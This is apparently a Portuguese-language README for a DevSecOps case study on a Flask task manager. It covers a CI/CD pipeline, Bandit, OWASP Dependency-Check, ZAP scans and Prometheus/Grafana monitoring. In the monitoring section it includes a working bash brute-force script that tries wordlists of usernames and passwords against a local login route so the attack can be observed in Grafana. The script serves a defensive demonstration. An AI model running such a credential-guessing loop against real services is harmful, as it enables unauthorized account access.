## INTRODUÇÃO

Este estudo de caso se refere a implementação e segurança de um sistema de gerenciamento de tarefas pessoais, integrando processos de SDLC, DevOps e DevSecOps para garantir eficiência e segurança.
<hr>


### ETAPA 1: PLANEJAMENTO E DEFINIÇÃO DE REQUISITOS

1. Clonar o projeto e instalar das dependências a partir do requiriments.txt:

```
Flask==2.3.2
Flask-Bcrypt==1.0.1
Flask-Login==0.6.3
Flask-SQLAlchemy==3.0.5
Flask-WTF==1.1.1
WTForms==3.1.1
Jinja2==3.1.2
werkzeug==2.3.3
coverage
python-dotenv
prometheus-flask-exporter
```
<br />

2. Construir o diagrama para entender o domínio do problema:

![dfd](https://github.com/user-attachments/assets/6809cba3-bd94-4042-beb3-96beb5435c44)

<hr>

### ETAPA 2: DESENVOLVIMENTO DO SISTEMA

**Branches:**
- `master`: produção  
- `development`: desenvolvimento  
- `staging`: homologação

**Ferramentas Utilizadas:**
- Visual Studio Code
- GitLab
- Docker
- Python
- Pytest
- Unittest
- Zed Attack Proxy
- Bandit
- OWASP Dependency-Check
- OWASP ZAP
- Hydra
- Prometheus
- Grafana

1. Implementação do Dockerfile:

![dockerfile](https://github.com/user-attachments/assets/2c5f592a-185b-4f68-b372-33077d93eed0)


2. Aplicação executada na porta 5000:

   ![app](https://github.com/user-attachments/assets/815bb208-495e-4b0b-9931-5ea3d2c150e5)


<hr>

### ETAPA 3: IMPLEMENTAÇÃO DE UM PIPELINE CI/CD

1. Implementação do build e deploy na pipeline:

![gitlabci](https://github.com/user-attachments/assets/8d68bae7-73df-4b91-9e75-5c012a159177)


2. Pipeline em execução no GitLab:

![pipeline-initial](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/pipeline-initial.png)
<hr>

### ETAPA 4: ANÁLISE ESTÁTICA DE CÓDIGO (SAST)

1. Implementação do Bandit na pipeline:

![bandit](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/bandit.png)

2. Artefato gerado mostrando dados sensíveis expostos na aplicação:

![artefact-bandit](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/artefact-zap-attack-tools.png)

3. Correção no código da falha capturada pelo Bandit:

![fix-bandit](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/fixenv.png)

4. Implementação do OWASP Dependency Check na pipeline:

![owasp-dependency_check](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/owasp-dependecy-check.png)

5. Artefato gerado com vulnerabilidades no código JavaScript:

![artefact-dependency](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/artifect-dependency-check.png)
<hr>

### ETAPA 5: ANÁLISE DINÂMICA DE SEGURANÇA (DAST)

1. Foi utilizada a aplicação Zed Attack Proxy (ZAP) para fazer uma varredura rápida na aplicação:

![zed](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/zap-attack-tools.png)

2. Artefato gerado mostrando as vulnerabilidades e níveis de risco:

![artefact-zed](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/artefact-zap-attack-tools.png)
<hr>

### ETAPA 6: ENTREGA CONTÍNUA (CD)

1. Implementação da etapa de revisão de código na pipeline:

![review](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/review-pipeline.png)

2. Implementação do OWASP ZAP para executar em toda a pipeline na homologação:

![owasp-zap](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/images/dast.png)
<hr>

### ETAPA 7: MONITORAMENTO

1. Implementação do Prometheus e Grafana na produção:

![prometheus-grafana](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/grafana-prometheus.png)

2. Implementação do ataque de força bruta em bash:

```
#!/bin/bash

URL="http://localhost:5000/login"   
USERNAMES="usernames.txt"        
PASSWORDS="passwords.txt"       

if [[ ! -f "$USERNAMES" || ! -f "$PASSWORDS" ]]; then
  echo "Os arquivos usernames.txt ou passwords.txt não foram encontrados."
  exit 1
fi

while IFS= read -r username; do
  while IFS= read -r password; do
    echo "Tentando login com Username: $username e Password: $password"    
 
    response=$(curl -s -X POST -d "username=$username&password=$password" "$URL")    
   
    if [[ $response == *"Login successful"* ]]; then
      echo "SUCESSO! Username: $username | Password: $password"
      exit 0
    fi
  done < "$PASSWORDS"
done < "$USERNAMES"
```
<br />
   
3. Acompanhamento pelo Grafana com o ataque de bruta force em execução na rota de login:

![monitory](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/monitory.png)
<hr>

### ETAPA 8: FEEDBACKS

1. A aplicação é antiga e precisou que algumas bibliotecas fossem atualizadas;
   
2. Foi corrigida uma das vulnerabilidades críticas capturada pelo bandit;
   
3. Testes funcionais e de integração foram implementados na etapa de homologação 
   
4. A pipeline foi testada de ponta a ponta, do desenvolvimento a homologação e produção:

![pipeline_full](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/pipeline-finished.png)

<br />
